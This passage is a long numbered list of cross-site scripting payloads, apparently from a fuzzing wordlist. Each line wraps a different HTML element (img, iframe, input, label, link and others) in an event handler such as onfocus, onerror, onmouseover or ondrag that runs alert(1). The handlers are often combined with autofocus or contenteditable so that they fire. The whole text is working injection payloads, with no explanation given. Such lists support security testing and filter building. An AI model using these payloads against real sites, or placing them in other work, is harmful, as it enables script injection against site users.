2300 | <html onblur=alert(1) tabindex=1 id=x></html><input autofocus>
2301 | <html onclick="alert(1)">test</html>
2302 | <html oncontextmenu="alert(1)">test</html>
2303 | <html oncopy="alert(1)" contenteditable>test</html>
2304 | <html oncut="alert(1)" contenteditable>test</html>
2305 | <html ondblclick="alert(1)">test</html>
2306 | <html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>
2307 | <html onkeydown="alert(1)" contenteditable>test</html>
2308 | <html onkeypress="alert(1)" contenteditable>test</html>
2309 | <html onkeyup="alert(1)" contenteditable>test</html>
2310 | <html onmousedown="alert(1)">test</html>
2311 | <html onmouseenter="alert(1)">test</html>
2312 | <html onmouseleave="alert(1)">test</html>
2313 | <html onmousemove="alert(1)">test</html>
2314 | <html onmouseout="alert(1)">test</html>
2315 | <html onmouseover="alert(1)">test</html>
2316 | <html onmouseup="alert(1)">test</html>
2317 | <html onpaste="alert(1)" contenteditable>test</html>
2318 | <i draggable="true" ondrag="alert(1)">test</i>
2319 | <i draggable="true" ondragend="alert(1)">test</i>
2320 | <i draggable="true" ondragenter="alert(1)">test</i>
2321 | <i draggable="true" ondragleave="alert(1)">test</i>
2322 | <i draggable="true" ondragstart="alert(1)">test</i>
2323 | <i id=x tabindex=1 onactivate=alert(1)></i>
2324 | <i id=x tabindex=1 onbeforeactivate=alert(1)></i>
2325 | <i id=x tabindex=1 onbeforedeactivate=alert(1)></i><input autofocus>
2326 | <i id=x tabindex=1 ondeactivate=alert(1)></i><input id=y autofocus>
2327 | <i id=x tabindex=1 onfocus=alert(1)></i>
2328 | <i id=x tabindex=1 onfocusin=alert(1)></i>
2329 | <i onbeforecopy="alert(1)" contenteditable>test</i>
2330 | <i onbeforecut="alert(1)" contenteditable>test</i>
2331 | <i onbeforepaste="alert(1)" contenteditable>test</i>
2332 | <i onblur=alert(1) tabindex=1 id=x></i><input autofocus>
2333 | <i onclick="alert(1)">test</i>
2334 | <i oncontextmenu="alert(1)">test</i>
2335 | <i oncopy="alert(1)" contenteditable>test</i>
2336 | <i oncut="alert(1)" contenteditable>test</i>
2337 | <i ondblclick="alert(1)">test</i>
2338 | <i onfocusout=alert(1) tabindex=1 id=x></i><input autofocus>
2339 | <i onkeydown="alert(1)" contenteditable>test</i>
2340 | <i onkeypress="alert(1)" contenteditable>test</i>
2341 | <i onkeyup="alert(1)" contenteditable>test</i>
2342 | <i onmousedown="alert(1)">test</i>
2343 | <i onmouseenter="alert(1)">test</i>
2344 | <i onmouseleave="alert(1)">test</i>
2345 | <i onmousemove="alert(1)">test</i>
2346 | <i onmouseout="alert(1)">test</i>
2347 | <i onmouseover="alert(1)">test</i>
2348 | <i onmouseup="alert(1)">test</i>
2349 | <i onpaste="alert(1)" contenteditable>test</i>
2350 | <iframe draggable="true" ondrag="alert(1)">test</iframe>
2351 | <iframe draggable="true" ondragend="alert(1)">test</iframe>
2352 | <iframe draggable="true" ondragenter="alert(1)">test</iframe>
2353 | <iframe draggable="true" ondragleave="alert(1)">test</iframe>
2354 | <iframe draggable="true" ondragstart="alert(1)">test</iframe>
2355 | <iframe id=x onfocus=alert(1)>
2356 | <iframe id=x onfocusin=alert(1)>
2357 | <iframe id=x tabindex=1 onactivate=alert(1)></iframe>
2358 | <iframe id=x tabindex=1 onbeforeactivate=alert(1)></iframe>
2359 | <iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>
2360 | <iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>
2361 | <iframe onbeforecopy="alert(1)" contenteditable>test</iframe>
2362 | <iframe onbeforecut="alert(1)" contenteditable>test</iframe>
2363 | <iframe onbeforepaste="alert(1)" contenteditable>test</iframe>
2364 | <iframe onblur=alert(1) id=x><input autofocus>
2365 | <iframe onclick="alert(1)">test</iframe>
2366 | <iframe oncontextmenu="alert(1)">test</iframe>
2367 | <iframe oncopy="alert(1)" contenteditable>test</iframe>
2368 | <iframe oncut="alert(1)" contenteditable>test</iframe>
2369 | <iframe ondblclick="alert(1)">test</iframe>
2370 | <iframe onfocusout=alert(1) id=x><input autofocus>
2371 | <iframe onkeydown="alert(1)" contenteditable>test</iframe>
2372 | <iframe onkeypress="alert(1)" contenteditable>test</iframe>
2373 | <iframe onkeyup="alert(1)" contenteditable>test</iframe>
2374 | <iframe onload=alert(1)></iframe>
2375 | <iframe onmousedown="alert(1)">test</iframe>
2376 | <iframe onmouseenter="alert(1)">test</iframe>
2377 | <iframe onmouseleave="alert(1)">test</iframe>
2378 | <iframe onmousemove="alert(1)">test</iframe>
2379 | <iframe onmouseout="alert(1)">test</iframe>
2380 | <iframe onmouseover="alert(1)">test</iframe>
2381 | <iframe onmouseup="alert(1)">test</iframe>
2382 | <iframe onpaste="alert(1)" contenteditable>test</iframe>
2383 | <iframe onreadystatechange=alert(1)></iframe>
2384 | <image draggable="true" ondrag="alert(1)">test</image>
2385 | <image draggable="true" ondragend="alert(1)">test</image>
2386 | <image draggable="true" ondragenter="alert(1)">test</image>
2387 | <image draggable="true" ondragleave="alert(1)">test</image>
2388 | <image draggable="true" ondragstart="alert(1)">test</image>
2389 | <image id=x tabindex=1 onactivate=alert(1)></image>
2390 | <image id=x tabindex=1 onbeforeactivate=alert(1)></image>
2391 | <image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>
2392 | <image id=x tabindex=1 ondeactivate=alert(1)></image><input id=y autofocus>
2393 | <image id=x tabindex=1 onfocus=alert(1)></image>
2394 | <image id=x tabindex=1 onfocusin=alert(1)></image>
2395 | <image onbeforecopy="alert(1)" contenteditable>test</image>
2396 | <image onbeforecut="alert(1)" contenteditable>test</image>
2397 | <image onbeforepaste="alert(1)" contenteditable>test</image>
2398 | <image onblur=alert(1) tabindex=1 id=x></image><input autofocus>
2399 | <image onclick="alert(1)">test</image>
2400 | <image oncontextmenu="alert(1)">test</image>
2401 | <image oncopy="alert(1)" contenteditable>test</image>
2402 | <image oncut="alert(1)" contenteditable>test</image>
2403 | <image ondblclick="alert(1)">test</image>
2404 | <image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>
2405 | <image onkeydown="alert(1)" contenteditable>test</image>
2406 | <image onkeypress="alert(1)" contenteditable>test</image>
2407 | <image onkeyup="alert(1)" contenteditable>test</image>
2408 | <image onmousedown="alert(1)">test</image>
2409 | <image onmouseenter="alert(1)">test</image>
2410 | <image onmouseleave="alert(1)">test</image>
2411 | <image onmousemove="alert(1)">test</image>
2412 | <image onmouseout="alert(1)">test</image>
2413 | <image onmouseover="alert(1)">test</image>
2414 | <image onmouseup="alert(1)">test</image>
2415 | <image onpaste="alert(1)" contenteditable>test</image>
2416 | <image src/onerror=alert(1)>
2417 | <image src=validimage.png onload=alert(1)>
2418 | <image src=validimage.png onloadend=alert(1)>
2419 | <image src=validimage.png onloadstart=alert(1)>
2420 | <image srcset=1 onerror=alert(1)>
2421 | <img draggable="true" ondrag="alert(1)">test</img>
2422 | <img draggable="true" ondragend="alert(1)">test</img>
2423 | <img draggable="true" ondragenter="alert(1)">test</img>
2424 | <img draggable="true" ondragleave="alert(1)">test</img>
2425 | <img draggable="true" ondragstart="alert(1)">test</img>
2426 | <img id=x tabindex=1 onactivate=alert(1)></img>
2427 | <img id=x tabindex=1 onbeforeactivate=alert(1)></img>
2428 | <img id=x tabindex=1 onbeforedeactivate=alert(1)></img><input autofocus>
2429 | <img id=x tabindex=1 ondeactivate=alert(1)></img><input id=y autofocus>
2430 | <img id=x tabindex=1 onfocus=alert(1)></img>
2431 | <img id=x tabindex=1 onfocusin=alert(1)></img>
2432 | <img onbeforecopy="alert(1)" contenteditable>test</img>
2433 | <img onbeforecut="alert(1)" contenteditable>test</img>
2434 | <img onbeforepaste="alert(1)" contenteditable>test</img>
2435 | <img onblur=alert(1) tabindex=1 id=x></img><input autofocus>
2436 | <img onclick="alert(1)">test</img>
2437 | <img oncontextmenu="alert(1)">test</img>
2438 | <img oncopy="alert(1)" contenteditable>test</img>
2439 | <img oncut="alert(1)" contenteditable>test</img>
2440 | <img ondblclick="alert(1)">test</img>
2441 | <img onfocusout=alert(1) tabindex=1 id=x></img><input autofocus>
2442 | <img onkeydown="alert(1)" contenteditable>test</img>
2443 | <img onkeypress="alert(1)" contenteditable>test</img>
2444 | <img onkeyup="alert(1)" contenteditable>test</img>
2445 | <img onmousedown="alert(1)">test</img>
2446 | <img onmouseenter="alert(1)">test</img>
2447 | <img onmouseleave="alert(1)">test</img>
2448 | <img onmousemove="alert(1)">test</img>
2449 | <img onmouseout="alert(1)">test</img>
2450 | <img onmouseover="alert(1)">test</img>
2451 | <img onmouseup="alert(1)">test</img>
2452 | <img onpaste="alert(1)" contenteditable>test</img>
2453 | <img src/onerror=alert(1)>
2454 | <img src=validimage.png onload=alert(1)>
2455 | <img src=validimage.png onloadend=alert(1)>
2456 | <img src=validimage.png onloadstart=alert(1)>
2457 | <img srcset=1 onerror=alert(1)>
2458 | <img srcset=validimage.png onload=alert(1)>
2459 | <img usemap=#x><map name="x"><area href onfocus=alert(1) id=x>
2460 | <img usemap=#x><map name="x"><area href onfocusin=alert(1) id=x>
2461 | <input autofocus onfocus=alert(1)>
2462 | <input autofocus onfocusin=alert(1)>
2463 | <input draggable="true" ondrag="alert(1)">test</input>
2464 | <input draggable="true" ondragend="alert(1)">test</input>
2465 | <input draggable="true" ondragenter="alert(1)">test</input>
2466 | <input draggable="true" ondragleave="alert(1)">test</input>
2467 | <input draggable="true" ondragstart="alert(1)">test</input>
2468 | <input id=x onfocus=alert(1)>
2469 | <input id=x onfocusin=alert(1)>
2470 | <input id=x tabindex=1 onactivate=alert(1)></input>
2471 | <input id=x tabindex=1 onbeforeactivate=alert(1)></input>
2472 | <input id=x tabindex=1 onbeforedeactivate=alert(1)></input><input autofocus>
2473 | <input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>
2474 | <input onauxclick=alert(1)>
2475 | <input onbeforecopy=alert(1) value="XSS" autofocus>
2476 | <input onbeforecut=alert(1) value="XSS" autofocus>
2477 | <input onbeforepaste=alert(1) value="" autofocus>
2478 | <input onblur=alert(1) id=x><input autofocus>
2479 | <input onchange=alert(1) value=xss>
2480 | <input onclick="alert(1)">test</input>
2481 | <input oncontextmenu="alert(1)">test</input>
2482 | <input oncopy=alert(1) value="XSS" autofocus>
2483 | <input oncut=alert(1) value="XSS" autofocus>
2484 | <input ondblclick="alert(1)">test</input>
2485 | <input onfocusout=alert(1) id=x><input autofocus>
2486 | <input oninput=alert(1) value=xss>
2487 | <input onkeydown="alert(1)" contenteditable>test</input>
2488 | <input onkeypress="alert(1)" contenteditable>test</input>
2489 | <input onkeyup="alert(1)" contenteditable>test</input>
2490 | <input onmousedown="alert(1)">test</input>
2491 | <input onmouseenter="alert(1)">test</input>
2492 | <input onmouseleave="alert(1)">test</input>
2493 | <input onmousemove="alert(1)">test</input>
2494 | <input onmouseout="alert(1)">test</input>
2495 | <input onmouseover="alert(1)">test</input>
2496 | <input onmouseup="alert(1)">test</input>
2497 | <input onpaste=alert(1) value="" autofocus>
2498 | <input onselect=alert(1) value="XSS" autofocus>
2499 | <input type=checkbox id=x onfocus=alert(1)>
2500 | <input type=checkbox id=x onfocusin=alert(1)>
2501 | <input type=image onloadend=alert(1) src=validimage.png>
2502 | <input type=image onloadstart=alert(1) src=validimage.png>
2503 | <input type=image src=1 onerror=alert(1)>
2504 | <input type=image src=validimage.png onload=alert(1)>
2505 | <input type=radio id=x onfocus=alert(1)>
2506 | <input type=radio id=x onfocusin=alert(1)>
2507 | <ins draggable="true" ondrag="alert(1)">test</ins>
2508 | <ins draggable="true" ondragend="alert(1)">test</ins>
2509 | <ins draggable="true" ondragenter="alert(1)">test</ins>
2510 | <ins draggable="true" ondragleave="alert(1)">test</ins>
2511 | <ins draggable="true" ondragstart="alert(1)">test</ins>
2512 | <ins id=x tabindex=1 onactivate=alert(1)></ins>
2513 | <ins id=x tabindex=1 onbeforeactivate=alert(1)></ins>
2514 | <ins id=x tabindex=1 onbeforedeactivate=alert(1)></ins><input autofocus>
2515 | <ins id=x tabindex=1 ondeactivate=alert(1)></ins><input id=y autofocus>
2516 | <ins id=x tabindex=1 onfocus=alert(1)></ins>
2517 | <ins id=x tabindex=1 onfocusin=alert(1)></ins>
2518 | <ins onbeforecopy="alert(1)" contenteditable>test</ins>
2519 | <ins onbeforecut="alert(1)" contenteditable>test</ins>
2520 | <ins onbeforepaste="alert(1)" contenteditable>test</ins>
2521 | <ins onblur=alert(1) tabindex=1 id=x></ins><input autofocus>
2522 | <ins onclick="alert(1)">test</ins>
2523 | <ins oncontextmenu="alert(1)">test</ins>
2524 | <ins oncopy="alert(1)" contenteditable>test</ins>
2525 | <ins oncut="alert(1)" contenteditable>test</ins>
2526 | <ins ondblclick="alert(1)">test</ins>
2527 | <ins onfocusout=alert(1) tabindex=1 id=x></ins><input autofocus>
2528 | <ins onkeydown="alert(1)" contenteditable>test</ins>
2529 | <ins onkeypress="alert(1)" contenteditable>test</ins>
2530 | <ins onkeyup="alert(1)" contenteditable>test</ins>
2531 | <ins onmousedown="alert(1)">test</ins>
2532 | <ins onmouseenter="alert(1)">test</ins>
2533 | <ins onmouseleave="alert(1)">test</ins>
2534 | <ins onmousemove="alert(1)">test</ins>
2535 | <ins onmouseout="alert(1)">test</ins>
2536 | <ins onmouseover="alert(1)">test</ins>
2537 | <ins onmouseup="alert(1)">test</ins>
2538 | <ins onpaste="alert(1)" contenteditable>test</ins>
2539 | <isindex draggable="true" ondrag="alert(1)">test</isindex>
2540 | <isindex draggable="true" ondragend="alert(1)">test</isindex>
2541 | <isindex draggable="true" ondragenter="alert(1)">test</isindex>
2542 | <isindex draggable="true" ondragleave="alert(1)">test</isindex>
2543 | <isindex draggable="true" ondragstart="alert(1)">test</isindex>
2544 | <isindex id=x tabindex=1 onactivate=alert(1)></isindex>
2545 | <isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>
2546 | <isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>
2547 | <isindex id=x tabindex=1 ondeactivate=alert(1)></isindex><input id=y autofocus>
2548 | <isindex id=x tabindex=1 onfocus=alert(1)></isindex>
2549 | <isindex id=x tabindex=1 onfocusin=alert(1)></isindex>
2550 | <isindex onbeforecopy="alert(1)" contenteditable>test</isindex>
2551 | <isindex onbeforecut="alert(1)" contenteditable>test</isindex>
2552 | <isindex onbeforepaste="alert(1)" contenteditable>test</isindex>
2553 | <isindex onblur=alert(1) tabindex=1 id=x></isindex><input autofocus>
2554 | <isindex onclick="alert(1)">test</isindex>
2555 | <isindex oncontextmenu="alert(1)">test</isindex>
2556 | <isindex oncopy="alert(1)" contenteditable>test</isindex>
2557 | <isindex oncut="alert(1)" contenteditable>test</isindex>
2558 | <isindex ondblclick="alert(1)">test</isindex>
2559 | <isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>
2560 | <isindex onkeydown="alert(1)" contenteditable>test</isindex>
2561 | <isindex onkeypress="alert(1)" contenteditable>test</isindex>
2562 | <isindex onkeyup="alert(1)" contenteditable>test</isindex>
2563 | <isindex onmousedown="alert(1)">test</isindex>
2564 | <isindex onmouseenter="alert(1)">test</isindex>
2565 | <isindex onmouseleave="alert(1)">test</isindex>
2566 | <isindex onmousemove="alert(1)">test</isindex>
2567 | <isindex onmouseout="alert(1)">test</isindex>
2568 | <isindex onmouseover="alert(1)">test</isindex>
2569 | <isindex onmouseup="alert(1)">test</isindex>
2570 | <isindex onpaste="alert(1)" contenteditable>test</isindex>
2571 | <isindex type=image onload=alert(1) src=validimage.png>
2572 | <isindex type=image src=1 onerror=alert(1)>
2573 | <kbd draggable="true" ondrag="alert(1)">test</kbd>
2574 | <kbd draggable="true" ondragend="alert(1)">test</kbd>
2575 | <kbd draggable="true" ondragenter="alert(1)">test</kbd>
2576 | <kbd draggable="true" ondragleave="alert(1)">test</kbd>
2577 | <kbd draggable="true" ondragstart="alert(1)">test</kbd>
2578 | <kbd id=x tabindex=1 onactivate=alert(1)></kbd>
2579 | <kbd id=x tabindex=1 onbeforeactivate=alert(1)></kbd>
2580 | <kbd id=x tabindex=1 onbeforedeactivate=alert(1)></kbd><input autofocus>
2581 | <kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>
2582 | <kbd id=x tabindex=1 onfocus=alert(1)></kbd>
2583 | <kbd id=x tabindex=1 onfocusin=alert(1)></kbd>
2584 | <kbd onbeforecopy="alert(1)" contenteditable>test</kbd>
2585 | <kbd onbeforecut="alert(1)" contenteditable>test</kbd>
2586 | <kbd onbeforepaste="alert(1)" contenteditable>test</kbd>
2587 | <kbd onblur=alert(1) tabindex=1 id=x></kbd><input autofocus>
2588 | <kbd onclick="alert(1)">test</kbd>
2589 | <kbd oncontextmenu="alert(1)">test</kbd>
2590 | <kbd oncopy="alert(1)" contenteditable>test</kbd>
2591 | <kbd oncut="alert(1)" contenteditable>test</kbd>
2592 | <kbd ondblclick="alert(1)">test</kbd>
2593 | <kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>
2594 | <kbd onkeydown="alert(1)" contenteditable>test</kbd>
2595 | <kbd onkeypress="alert(1)" contenteditable>test</kbd>
2596 | <kbd onkeyup="alert(1)" contenteditable>test</kbd>
2597 | <kbd onmousedown="alert(1)">test</kbd>
2598 | <kbd onmouseenter="alert(1)">test</kbd>
2599 | <kbd onmouseleave="alert(1)">test</kbd>
2600 | <kbd onmousemove="alert(1)">test</kbd>
2601 | <kbd onmouseout="alert(1)">test</kbd>
2602 | <kbd onmouseover="alert(1)">test</kbd>
2603 | <kbd onmouseup="alert(1)">test</kbd>
2604 | <kbd onpaste="alert(1)" contenteditable>test</kbd>
2605 | <keygen autofocus onfocus=alert(1)>
2606 | <keygen autofocus onfocusin=alert(1)>
2607 | <keygen draggable="true" ondrag="alert(1)">test</keygen>
2608 | <keygen draggable="true" ondragend="alert(1)">test</keygen>
2609 | <keygen draggable="true" ondragenter="alert(1)">test</keygen>
2610 | <keygen draggable="true" ondragleave="alert(1)">test</keygen>
2611 | <keygen draggable="true" ondragstart="alert(1)">test</keygen>
2612 | <keygen id=x onfocus=alert(1)>
2613 | <keygen id=x onfocusin=alert(1)>
2614 | <keygen id=x tabindex=1 onactivate=alert(1)></keygen>
2615 | <keygen id=x tabindex=1 onbeforeactivate=alert(1)></keygen>
2616 | <keygen id=x tabindex=1 onbeforedeactivate=alert(1)></keygen><input autofocus>
2617 | <keygen id=x tabindex=1 ondeactivate=alert(1)></keygen><input id=y autofocus>
2618 | <keygen onbeforecopy="alert(1)" contenteditable>test</keygen>
2619 | <keygen onbeforecut="alert(1)" contenteditable>test</keygen>
2620 | <keygen onbeforepaste="alert(1)" contenteditable>test</keygen>
2621 | <keygen onblur=alert(1) tabindex=1 id=x></keygen><input autofocus>
2622 | <keygen onclick="alert(1)">test</keygen>
2623 | <keygen oncontextmenu="alert(1)">test</keygen>
2624 | <keygen oncopy="alert(1)" contenteditable>test</keygen>
2625 | <keygen oncut="alert(1)" contenteditable>test</keygen>
2626 | <keygen ondblclick="alert(1)">test</keygen>
2627 | <keygen onfocusout=alert(1) tabindex=1 id=x></keygen><input autofocus>
2628 | <keygen onkeydown="alert(1)" contenteditable>test</keygen>
2629 | <keygen onkeypress="alert(1)" contenteditable>test</keygen>
2630 | <keygen onkeyup="alert(1)" contenteditable>test</keygen>
2631 | <keygen onmousedown="alert(1)">test</keygen>
2632 | <keygen onmouseenter="alert(1)">test</keygen>
2633 | <keygen onmouseleave="alert(1)">test</keygen>
2634 | <keygen onmousemove="alert(1)">test</keygen>
2635 | <keygen onmouseout="alert(1)">test</keygen>
2636 | <keygen onmouseover="alert(1)">test</keygen>
2637 | <keygen onmouseup="alert(1)">test</keygen>
2638 | <keygen onpaste="alert(1)" contenteditable>test</keygen>
2639 | <label draggable="true" ondrag="alert(1)">test</label>
2640 | <label draggable="true" ondragend="alert(1)">test</label>
2641 | <label draggable="true" ondragenter="alert(1)">test</label>
2642 | <label draggable="true" ondragleave="alert(1)">test</label>
2643 | <label draggable="true" ondragstart="alert(1)">test</label>
2644 | <label id=x tabindex=1 onactivate=alert(1)></label>
2645 | <label id=x tabindex=1 onbeforeactivate=alert(1)></label>
2646 | <label id=x tabindex=1 onbeforedeactivate=alert(1)></label><input autofocus>
2647 | <label id=x tabindex=1 ondeactivate=alert(1)></label><input id=y autofocus>
2648 | <label id=x tabindex=1 onfocus=alert(1)></label>
2649 | <label id=x tabindex=1 onfocusin=alert(1)></label>
2650 | <label onbeforecopy="alert(1)" contenteditable>test</label>
2651 | <label onbeforecut="alert(1)" contenteditable>test</label>
2652 | <label onbeforepaste="alert(1)" contenteditable>test</label>
2653 | <label onblur=alert(1) tabindex=1 id=x></label><input autofocus>
2654 | <label onclick="alert(1)">test</label>
2655 | <label oncontextmenu="alert(1)">test</label>
2656 | <label oncopy="alert(1)" contenteditable>test</label>
2657 | <label oncut="alert(1)" contenteditable>test</label>
2658 | <label ondblclick="alert(1)">test</label>
2659 | <label onfocusout=alert(1) tabindex=1 id=x></label><input autofocus>
2660 | <label onkeydown="alert(1)" contenteditable>test</label>
2661 | <label onkeypress="alert(1)" contenteditable>test</label>
2662 | <label onkeyup="alert(1)" contenteditable>test</label>
2663 | <label onmousedown="alert(1)">test</label>
2664 | <label onmouseenter="alert(1)">test</label>
2665 | <label onmouseleave="alert(1)">test</label>
2666 | <label onmousemove="alert(1)">test</label>
2667 | <label onmouseout="alert(1)">test</label>
2668 | <label onmouseover="alert(1)">test</label>
2669 | <label onmouseup="alert(1)">test</label>
2670 | <label onpaste="alert(1)" contenteditable>test</label>
2671 | <legend draggable="true" ondrag="alert(1)">test</legend>
2672 | <legend draggable="true" ondragend="alert(1)">test</legend>
2673 | <legend draggable="true" ondragenter="alert(1)">test</legend>
2674 | <legend draggable="true" ondragleave="alert(1)">test</legend>
2675 | <legend draggable="true" ondragstart="alert(1)">test</legend>
2676 | <legend id=x tabindex=1 onactivate=alert(1)></legend>
2677 | <legend id=x tabindex=1 onbeforeactivate=alert(1)></legend>
2678 | <legend id=x tabindex=1 onbeforedeactivate=alert(1)></legend><input autofocus>
2679 | <legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>
2680 | <legend id=x tabindex=1 onfocus=alert(1)></legend>
2681 | <legend id=x tabindex=1 onfocusin=alert(1)></legend>
2682 | <legend onbeforecopy="alert(1)" contenteditable>test</legend>
2683 | <legend onbeforecut="alert(1)" contenteditable>test</legend>
2684 | <legend onbeforepaste="alert(1)" contenteditable>test</legend>
2685 | <legend onblur=alert(1) tabindex=1 id=x></legend><input autofocus>
2686 | <legend onclick="alert(1)">test</legend>
2687 | <legend oncontextmenu="alert(1)">test</legend>
2688 | <legend oncopy="alert(1)" contenteditable>test</legend>
2689 | <legend oncut="alert(1)" contenteditable>test</legend>
2690 | <legend ondblclick="alert(1)">test</legend>
2691 | <legend onfocusout=alert(1) tabindex=1 id=x></legend><input autofocus>
2692 | <legend onkeydown="alert(1)" contenteditable>test</legend>
2693 | <legend onkeypress="alert(1)" contenteditable>test</legend>
2694 | <legend onkeyup="alert(1)" contenteditable>test</legend>
2695 | <legend onmousedown="alert(1)">test</legend>
2696 | <legend onmouseenter="alert(1)">test</legend>
2697 | <legend onmouseleave="alert(1)">test</legend>
2698 | <legend onmousemove="alert(1)">test</legend>
2699 | <legend onmouseout="alert(1)">test</legend>
2700 | <legend onmouseover="alert(1)">test</legend>
2701 | <legend onmouseup="alert(1)">test</legend>
2702 | <legend onpaste="alert(1)" contenteditable>test</legend>
2703 | <li draggable="true" ondrag="alert(1)">test</li>
2704 | <li draggable="true" ondragend="alert(1)">test</li>
2705 | <li draggable="true" ondragenter="alert(1)">test</li>
2706 | <li draggable="true" ondragleave="alert(1)">test</li>
2707 | <li draggable="true" ondragstart="alert(1)">test</li>
2708 | <li id=x tabindex=1 onactivate=alert(1)></li>
2709 | <li id=x tabindex=1 onbeforeactivate=alert(1)></li>
2710 | <li id=x tabindex=1 onbeforedeactivate=alert(1)></li><input autofocus>
2711 | <li id=x tabindex=1 ondeactivate=alert(1)></li><input id=y autofocus>
2712 | <li id=x tabindex=1 onfocus=alert(1)></li>
2713 | <li id=x tabindex=1 onfocusin=alert(1)></li>
2714 | <li onbeforecopy="alert(1)" contenteditable>test</li>
2715 | <li onbeforecut="alert(1)" contenteditable>test</li>
2716 | <li onbeforepaste="alert(1)" contenteditable>test</li>
2717 | <li onblur=alert(1) tabindex=1 id=x></li><input autofocus>
2718 | <li onclick="alert(1)">test</li>
2719 | <li oncontextmenu="alert(1)">test</li>
2720 | <li oncopy="alert(1)" contenteditable>test</li>
2721 | <li oncut="alert(1)" contenteditable>test</li>
2722 | <li ondblclick="alert(1)">test</li>
2723 | <li onfocusout=alert(1) tabindex=1 id=x></li><input autofocus>
2724 | <li onkeydown="alert(1)" contenteditable>test</li>
2725 | <li onkeypress="alert(1)" contenteditable>test</li>
2726 | <li onkeyup="alert(1)" contenteditable>test</li>
2727 | <li onmousedown="alert(1)">test</li>
2728 | <li onmouseenter="alert(1)">test</li>
2729 | <li onmouseleave="alert(1)">test</li>
2730 | <li onmousemove="alert(1)">test</li>
2731 | <li onmouseout="alert(1)">test</li>
2732 | <li onmouseover="alert(1)">test</li>
2733 | <li onmouseup="alert(1)">test</li>
2734 | <li onpaste="alert(1)" contenteditable>test</li>
2735 | <link draggable="true" ondrag="alert(1)">test</link>
2736 | <link draggable="true" ondragend="alert(1)">test</link>
2737 | <link draggable="true" ondragenter="alert(1)">test</link>
2738 | <link draggable="true" ondragleave="alert(1)">test</link>
2739 | <link draggable="true" ondragstart="alert(1)">test</link>
2740 | <link href=validstyles.css rel=stylesheet onload=alert(1)>
2741 | <link id=x tabindex=1 onactivate=alert(1)></link>
2742 | <link id=x tabindex=1 onbeforeactivate=alert(1)></link>
2743 | <link id=x tabindex=1 onbeforedeactivate=alert(1)></link><input autofocus>
2744 | <link id=x tabindex=1 ondeactivate=alert(1)></link><input id=y autofocus>
2745 | <link onbeforecopy="alert(1)" contenteditable>test</link>
2746 | <link onbeforecut="alert(1)" contenteditable>test</link>
2747 | <link onbeforepaste="alert(1)" contenteditable>test</link>
2748 | <link onblur=alert(1) tabindex=1 id=x></link><input autofocus>
2749 | <link onclick="alert(1)">test</link>
2750 | <link oncontextmenu="alert(1)">test</link>
2751 | <link oncopy="alert(1)" contenteditable>test</link>
2752 | <link oncut="alert(1)" contenteditable>test</link>
2753 | <link ondblclick="alert(1)">test</link>
2754 | <link onfocus=alert(1) id=x tabindex=1 style=display:block>
2755 | <link onfocusin=alert(1) id=x tabindex=1 style=display:block>
2756 | <link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>
2757 | <link onkeydown="alert(1)" contenteditable>test</link>
2758 | <link onkeypress="alert(1)" contenteditable>test</link>
2759 | <link onkeyup="alert(1)" contenteditable>test</link>
2760 | <link onmousedown="alert(1)">test</link>
2761 | <link onmouseenter="alert(1)">test</link>
2762 | <link onmouseleave="alert(1)">test</link>
2763 | <link onmousemove="alert(1)">test</link>
2764 | <link onmouseout="alert(1)">test</link>
2765 | <link onmouseover="alert(1)">test</link>
2766 | <link onmouseup="alert(1)">test</link>
2767 | <link onpaste="alert(1)" contenteditable>test</link>
2768 | <link onreadystatechange=alert(1) rel=stylesheet href=1>
2769 | <link rel=stylesheet href=1 onerror=alert(1)>
2770 | <listing draggable="true" ondrag="alert(1)">test</listing>
2771 | <listing draggable="true" ondragend="alert(1)">test</listing>
2772 | <listing draggable="true" ondragenter="alert(1)">test</listing>
2773 | <listing draggable="true" ondragleave="alert(1)">test</listing>
2774 | <listing draggable="true" ondragstart="alert(1)">test</listing>
2775 | <listing id=x tabindex=1 onactivate=alert(1)></listing>
2776 | <listing id=x tabindex=1 onbeforeactivate=alert(1)></listing>
2777 | <listing id=x tabindex=1 onbeforedeactivate=alert(1)></listing><input autofocus>
2778 | <listing id=x tabindex=1 ondeactivate=alert(1)></listing><input id=y autofocus>
2779 | <listing id=x tabindex=1 onfocus=alert(1)></listing>
2780 | <listing id=x tabindex=1 onfocusin=alert(1)></listing>
2781 | <listing onbeforecopy="alert(1)" contenteditable>test</listing>
2782 | <listing onbeforecut="alert(1)" contenteditable>test</listing>
2783 | <listing onbeforepaste="alert(1)" contenteditable>test</listing>
2784 | <listing onblur=alert(1) tabindex=1 id=x></listing><input autofocus>
2785 | <listing onclick="alert(1)">test</listing>
2786 | <listing oncontextmenu="alert(1)">test</listing>
2787 | <listing oncopy="alert(1)" contenteditable>test</listing>
2788 | <listing oncut="alert(1)" contenteditable>test</listing>
2789 | <listing ondblclick="alert(1)">test</listing>
2790 | <listing onfocusout=alert(1) tabindex=1 id=x></listing><input autofocus>
2791 | <listing onkeydown="alert(1)" contenteditable>test</listing>
2792 | <listing onkeypress="alert(1)" contenteditable>test</listing>
2793 | <listing onkeyup="alert(1)" contenteditable>test</listing>
2794 | <listing onmousedown="alert(1)">test</listing>
2795 | <listing onmouseenter="alert(1)">test</listing>
2796 | <listing onmouseleave="alert(1)">test</listing>
2797 | <listing onmousemove="alert(1)">test</listing>
2798 | <listing onmouseout="alert(1)">test</listing>
2799 | <listing onmouseover="alert(1)">test</listing>
2800 | <listing onmouseup="alert(1)">test</listing>
2801 | <listing onpaste="alert(1)" contenteditable>test</listing>
2802 | <main draggable="true" ondrag="alert(1)">test</main>
2803 | <main draggable="true" ondragend="alert(1)">test</main>
2804 | <main draggable="true" ondragenter="alert(1)">test</main>
2805 | <main draggable="true" ondragleave="alert(1)">test</main>
2806 | <main draggable="true" ondragstart="alert(1)">test</main>
2807 | <main id=x tabindex=1 onactivate=alert(1)></main>
